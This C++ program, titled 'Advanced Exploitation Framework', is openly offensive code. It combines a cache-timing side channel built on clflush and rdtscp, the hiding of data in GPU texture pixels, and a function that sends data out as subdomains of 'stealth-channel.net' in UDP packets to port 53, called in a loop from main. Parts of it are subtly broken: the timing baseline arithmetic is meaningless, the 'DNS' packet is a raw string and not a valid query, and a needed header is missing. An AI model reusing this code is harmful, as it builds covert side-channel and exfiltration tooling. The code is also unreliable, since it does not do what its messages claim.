#include <emmintrin.h>
#include <chrono>
#include <thread>
#include <iostream>
#include <vector>
#include <GL/glew.h>
#include <GLFW/glfw3.h>
#include <arpa/inet.h>

#define PAGE_SIZE 4096

volatile char cryptoBuffer[PAGE_SIZE];

inline uint64_t rdtscp() {
    uint32_t lo, hi;
    asm volatile("rdtscp" : "=a"(lo), "=d"(hi) :: "%rcx");
    return ((uint64_t)hi << 32) | lo;
}

void monitorCryptoBuffer() {
    uint64_t baseline = 0, noiseThreshold = 200;

    for (int i = 0; i < 10; ++i) {
        _mm_clflush(cryptoBuffer);
        baseline += rdtscp() - (_mm_clflush(cryptoBuffer), rdtscp());
    }
    baseline /= 10;

    while (true) {
        _mm_clflush(cryptoBuffer);
        auto start = rdtscp();
        (void)*cryptoBuffer;
        auto timing = rdtscp() - start;

        if (timing > baseline + noiseThreshold) {
            std::cout << "[Cache Monitor] Detected cryptographic operation! Timing: " << timing << " cycles\n";
        }
        std::this_thread::sleep_for(std::chrono::microseconds(50));
    }
}

const char* advancedFragmentShader = R"(
    #version 450 core
    layout(location = 0) out vec4 fragColor;

    uniform sampler2D sharedTexture;
    uniform vec2 resolution;
    uniform float dataOffset;

    void main() {
        vec2 uv = gl_FragCoord.xy / resolution;
        vec4 pixelData = texture(sharedTexture, uv);
        pixelData.r += dataOffset;
        pixelData.g -= dataOffset * 0.5;
        pixelData.b += mod(dataOffset, 0.2);
        fragColor = pixelData;
    }
)";

GLuint createSharedTextureResource(int width, int height) {
    GLuint texture;
    glGenTextures(1, &texture);
    glBindTexture(GL_TEXTURE_2D, texture);
    glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA32F, width, height, 0, GL_RGBA, GL_FLOAT, nullptr);

    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);

    std::cout << "[Shared Resource] Texture created for GPU exploitation.\n";
    return texture;
}

void encodeDataInPixels(GLuint texture, const std::string& data) {
    glBindTexture(GL_TEXTURE_2D, texture);
    std::vector<float> pixelData(2048 * 2048 * 4, 0.0f);

    for (size_t i = 0; i < data.size(); ++i) {
        pixelData[i * 4] = (float)(data[i]) / 255.0f;
        pixelData[i * 4 + 1] = (float)(data[i] ^ 0xAA) / 255.0f;
    }

    glTexSubImage2D(GL_TEXTURE_2D, 0, 0, 0, 2048, 2048, GL_RGBA, GL_FLOAT, pixelData.data());
    std::cout << "[Pixel Encoding] Data encoded into GPU texture.\n";
}

// Exfiltrate data over DNS
void exfiltrateDataOverDNS(const std::string& data) {
    std::string domain = data + ".stealth-channel.net";
    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    if (sock < 0) {
        std::cerr << "[Error] chill guy couldn't connect, smh.\n";
        return;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &serverAddr.sin_addr);

    sendto(sock, domain.c_str(), domain.size(), 0, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    std::cout << "[Covert Channel] Data exfiltrated via DNS: " << domain << "\n";
    close(sock);
}

int main() {
    if (!glfwInit()) {
        std::cerr << "[Error] Failed to initialize GLFW.\n";
        return -1;
    }

    GLFWwindow* window = glfwCreateWindow(800, 600, "Advanced Exploitation Framework", NULL, NULL);
    if (!window) {
        std::cerr << "[Error] Failed to create window.\n";
        glfwTerminate();
        return -1;
    }
    glfwMakeContextCurrent(window);
    glewInit();

    GLuint sharedTexture = createSharedTextureResource(2048, 2048);

    GLuint fragmentShader = glCreateShader(GL_FRAGMENT_SHADER);
    glShaderSource(fragmentShader, 1, &advancedFragmentShader, nullptr);
    glCompileShader(fragmentShader);

    GLuint shaderProgram = glCreateProgram();
    glAttachShader(shaderProgram, fragmentShader);
    glLinkProgram(shaderProgram);
    glUseProgram(shaderProgram);

    std::thread monitorThread(monitorCryptoBuffer);

    while (!glfwWindowShouldClose(window)) {
        encodeDataInPixels(sharedTexture, "SensitiveData123");
        exfiltrateDataOverDNS("EncryptedTimingData");

        glfwSwapBuffers(window);
        glfwPollEvents();
    }

    monitorThread.join();
    glfwDestroyWindow(window);
    glfwTerminate();
    return 0;
}
